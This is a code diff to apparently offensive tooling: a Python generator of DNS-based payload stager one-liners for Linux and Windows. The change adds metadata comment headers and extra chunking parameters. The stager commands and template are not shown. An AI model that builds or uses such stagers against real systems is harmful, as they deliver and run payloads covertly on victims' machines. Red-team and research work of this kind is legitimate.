@@ -146,6 +146,19 @@ def _write_ascii(path, text):
         handle.write(text.encode('ascii'))
 
 
+def _format_metadata_lines(comment_prefix, entries):
+    lines = []
+    prefix = _ensure_ascii_text(comment_prefix, 'comment_prefix')
+    lines.append('%ssfb dns stager metadata' % prefix)
+    for key, value in entries:
+        if value is None:
+            continue
+        key_text = _ensure_ascii_text(str(key), 'metadata key')
+        value_text = _ensure_ascii_text(str(value), 'metadata value')
+        lines.append('%s%s: %s' % (prefix, key_text, value_text))
+    return lines
+
+
 def _normalize_domain(base_domain):
     base_domain = _ensure_ascii_text(base_domain, 'base_domain').strip()
     if not base_domain:
@@ -356,7 +369,7 @@ def build_one_liner(payload, platform):
 
 def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
                       output_dir=None, template_path=None, cname_label=None,
-                      index_seed=None):
+                      index_seed=None, flat_count=None, flat_chunk_size=None):
     repo_root = _repo_root()
     if output_dir is None:
         output_dir = repo_root
@@ -369,6 +382,9 @@ def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
             'dns_stager_template.py',
         )
     payload_hash = _payload_hash(payload_bytes)
+    seed_value = _normalize_index_seed(index_seed)
+    seed_hex = '%08x' % seed_value
+    args_text = _format_args_list(sfb_args or [])
     linux_payload = render_dns_stager(
         template_path,
         base_domain,
@@ -376,7 +392,7 @@ def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
         LINUX_RESOLVER_SNIPPET,
         cname_label=cname_label,
         payload_hash=payload_hash,
-        index_seed=index_seed,
+        index_seed=seed_value,
     )
     windows_payload = render_dns_stager(
         template_path,
@@ -385,12 +401,31 @@ def write_dns_stagers(base_domain, sfb_args=None, payload_bytes=None,
         WINDOWS_RESOLVER_SNIPPET,
         cname_label=cname_label,
         payload_hash=payload_hash,
-        index_seed=index_seed,
+        index_seed=seed_value,
     )
     linux_cmd = build_one_liner(linux_payload, platform='posix')
     windows_cmd = build_one_liner(windows_payload, platform='windows')
+    cname_suffix = _build_cname_suffix(_normalize_domain(base_domain), cname_label)
+    metadata_entries = [
+        ('base_domain', base_domain),
+        ('cname_label', cname_label or ''),
+        ('cname_suffix', cname_suffix),
+        ('payload_hash', payload_hash),
+        ('index_seed', seed_value),
+        ('index_seed_hex', seed_hex),
+        ('payload_bytes', len(payload_bytes) if payload_bytes is not None else None),
+        ('flat_count', flat_count),
+        ('flat_chunk_size', flat_chunk_size),
+        ('sfb_args', args_text),
+    ]
+    linux_lines = []
+    linux_lines.extend(_format_metadata_lines('# ', metadata_entries))
+    linux_lines.append(linux_cmd)
+    windows_lines = []
+    windows_lines.extend(_format_metadata_lines('REM ', metadata_entries))
+    windows_lines.append(windows_cmd)
     linux_path = os.path.join(output_dir, 'linux_dns_stager.txt')
     windows_path = os.path.join(output_dir, 'windows_dns_stager.txt')
-    _write_ascii(linux_path, linux_cmd + '\n')
-    _write_ascii(windows_path, windows_cmd + '\n')
+    _write_ascii(linux_path, '\n'.join(linux_lines) + '\n')
+    _write_ascii(windows_path, '\n'.join(windows_lines) + '\n')
     return {'linux': linux_path, 'windows': windows_path}
